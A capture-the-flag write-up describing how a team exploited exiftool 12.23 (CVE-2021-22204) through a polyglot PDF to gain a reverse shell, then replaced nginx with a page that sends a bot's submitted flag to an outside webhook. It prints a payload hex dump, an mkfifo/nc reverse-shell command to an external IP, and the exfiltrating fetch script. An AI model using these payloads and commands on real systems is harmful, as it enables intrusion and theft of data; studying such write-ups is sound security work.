# Ruthless Monster

**Category**: web, misc \
**Solves**: 13 \
**Points**: 333 \
**Author**: geolado

Please, help me! The bad guys are using this server to send secret evil files. Could you intercept one of these files to me?

> PS: The servers are rebooted every N minutes \
> PS2: The bad guys send the file every 15 seconds.

Files: [ruthless_monster.tar.gz](ruthless_monster.tar.gz) \
Server: https://ruthless.monster

## Overview

There are only two files in the zip: a `Dockerfile` and `html/exif/index.php`.

The `/exif` page lets you upload a PDF, checks that the file starts with `%PDF-`, then runs:

```php
echo shell_exec('timeout 10s exiftool ' . escapeshellarg($target_file));
```

The `Dockerfile` is very short:

```dockerfile
FROM privatebin/nginx-fpm-alpine

COPY html /var/www

USER root

RUN chown root:root -R /var/www
RUN chown root:root -R /srv/
RUN chmod 755 -R /srv/
RUN chmod 755 -R /var/www
RUN chmod 777 -R /srv/data/

WORKDIR /root
RUN apk add perl make
RUN wget https://exiftool.org/Image-ExifTool-12.23.tar.gz && tar -xzf Image-ExifTool-12.23.tar.gz && rm Image-ExifTool-12.23.tar.gz &&\
cd Image-ExifTool-12.23 && perl Makefile.PL && make test && make install && mkdir /uploads && chmod 777 /uploads

WORKDIR /var/www
USER 65534:82
```

I remembered seeing a recent [CVE](https://hackerone.com/reports/1154542) on
exiftool that led to RCE, and this challenge used version 12.23, which is
vulnerable.

So the goal of the challenge is:
1. Get RCE through exiftool
2. Intercept the flag which gets posted to the PrivateBin every 15 seconds

## Solution

Solved with @jerieeee, who did most of the work

### Part 1: RCE through exiftool

- I used this [public PoC](https://github.com/convisoappsec/CVE-2021-22204-exiftool)
- Ran `python3 exploit.py`
- Prepended `%PDF-` to the file
- Ran `exiftool image.pdf`, and it gave me a reverse shell.

---

Of course we also had to spend around 3 hours trying a bunch of stupid stuff and reading
through the exiftool's source code (perl 🤢) before we got RCE to work.

First of all, the vulnerability is only in the DjVu module:

```perl
# convert C escape sequences (allowed in quoted text)
$tok = eval qq{"$tok"};
```

So we have to trick `exiftool` into loading the DjVu module even though the
file must start with `%PDF-`.

At first this seemed impossible, but it turns out exiftool has a special case
for `JPEG` files, which can be abused to make exiftool parse magic bytes even
when they don't appear at the start of the file.

```perl
# last ditch effort to scan past unknown header for JPEG/TIFF
next unless $buff =~ /(\xff\xd8\xff|MM\0\x2a|II\x2a\0)/g;
$type = ($1 eq "\xff\xd8\xff") ? 'JPEG' : 'TIFF';
my $skip = pos($buff) - length($1);
$dirInfo{Base} = $pos + $skip;
$raf->Seek($pos + $skip, 0) or $seekErr = 1, last;
$self->Warn("Processing $type-like data after unknown $skip-byte header");
$unkHeader = 1 unless $$self{DOC_NUM};
```

So in the end our payload looked like this:

```xxd
00000000: 2550 4446 2dff d8ff e000 104a 4649 4600  %PDF-......JFIF.
00000010: 0101 0100 4800 4800 00ff e101 c045 7869  ....H.H......Exi
00000020: 6600 004d 4d00 2a00 0000 0800 0501 1a00  f..MM.*.........
00000030: 0500 0000 0100 0000 4a01 1b00 0500 0000  ........J.......
00000040: 0100 0000 5201 2800 0300 0000 0100 0200  ....R.(.........
00000050: 0002 1300 0300 0000 0100 0100 00c5 1b00  ................
00000060: 0200 0001 5e00 0000 5a00 0000 0000 0000  ....^...Z.......
00000070: 4800 0000 0100 0000 4800 0000 0141 5426  H.......H....AT&
00000080: 5446 4f52 4d00 0001 5144 4a56 5549 4e46  TFORM...QDJVUINF
00000090: 4f00 0000 0a00 0100 0118 002c 0116 0142  O..........,...B
000000a0: 476a 7000 0000 0041 4e54 7a00 0001 2bff  Gjp....ANTz...+.
...
```

You can see that it starts with `%PDF-` but also has a `JFIF` header, and then
has `AT&TFORM` a little further down, which are the AIFF magic bytes. The AIFF
module will then load the DjVu module.

### Part 2: Intercepting the flag

After popping a reverse shell on the remote server, it was 4 AM on Sunday so
I went to bed and jerieeee did the rest of the challenge, so I'll try to
explain how she solved it.

First of all, we're logged in as `nobody`:

```
/var/www/exif $ id
uid=65534(nobody) gid=82(www-data)
```

We can also see that many of the processes are running as `nobody`,
specifically `nginx` and `php`.

```
PID   USER     TIME  COMMAND
    1 nobody    0:00 s6-svscan -t0 /var/run/s6/services
   36 nobody    0:00 s6-supervise nginx
   37 nobody    0:00 s6-supervise php-fpm8
   38 nobody    0:00 s6-supervise s6-fdholderd
   40 nobody    0:00 {php-fpm8} php-fpm: master process (/etc/php8/php-fpm.conf)
   51 nobody    0:00 {php-fpm8} php-fpm: pool www
   52 nobody    0:00 {php-fpm8} php-fpm: pool www
  170 nobody    0:00 [exiftool]
  173 nobody    0:00 sh -c rm /tmp/.xff;mkfifo /tmp/.ffx;cat /tmp/.ffx|/bin/sh -i 2>&1|nc 207.154.208.77 1234 >/tmp/.ffx   <-- Looks like another team's reverse shell lol
  176 nobody    0:00 cat /tmp/.ffx
  177 nobody    0:00 /bin/sh -i
  178 nobody    0:00 nc 207.154.208.77 1234
  184 nobody    0:00 /bin/sh -i
  187 nobody    0:00 {php-fpm8} php-fpm: pool www
  200 nobody    0:00 nginx: master process /usr/sbin/nginx
  201 nobody    0:00 nginx: worker process
  202 nobody    0:00 nginx: worker process
  220 nobody    0:00 ps aux
```

Since PrivateBin is supposedly a zero-knowledge pastebin, it would be difficult
to directly hijack the service and decrypt the pastes.

However, we can do this:
1. Kill all nginx processes
2. Spawn our own nginx process that hosts a malicious webpage that exfiltrates the flag to us
3. Wait for the admin bot to send the flag on our page

Here's the nginx conf that was used (luckily the port is 8080 so we have
permission to bind it):

```nginx
worker_processes 1;
worker_rlimit_nofile 8192;
error_log /dev/null warn;
events {
  worker_connections 8000;
}
pid /run/nginx.pid;
daemon off;
timer_resolution 500ms;
http {
    default_type  application/octet-stream;
    charset_types text/css text/plain text/vnd.wap.wml application/javascript application/json application/rss+xml application/xml;
    server_tokens off;
    charset utf-8;
    keepalive_timeout 20s;
    sendfile        on;
    access_log /dev/null;
    tcp_nopush      on;
    server {
            listen 8080 default_server;
            listen [::]:8080 default_server;
            root /tmp;
            index index.html;
    }
}
```

Here's `index.html`:

```html
<html>
<body>
<textarea id="message" name="message" cols="80" rows="25" class="form-control" spellcheck="false"></textarea>
<button id="sendbutton" type="button" class="btn btn-primary">
<span class="glyphicon glyphicon-upload" aria-hidden="true"></span> Send</button>
<script type="text/javascript">
    document.querySelector("#sendbutton").onclick = ()=>fetch("https://da08338acc23cd10f7229bd5e84ba970.m.pipedream.net/"+document.querySelector("#message").value)
</script>
</body>
</html>
```

We can put these files in `/tmp` and run:
```
kill -9 <pid of all nginx processes> && nginx -c /tmp/conf
```

Even though there are shields respawning nginx processes, this one will be
faster than whatever monitor resolution they have. So eventually this server
will replace the legit server (the respawned processes will be get a
port-already-in-use error and die)

Then we just wait for the admin bot to send us the flag:

```
CTF-BR{Pl3453_d0nt_t3ll_m3_y0u_burn3d_4_0day_0n_th1s}
```
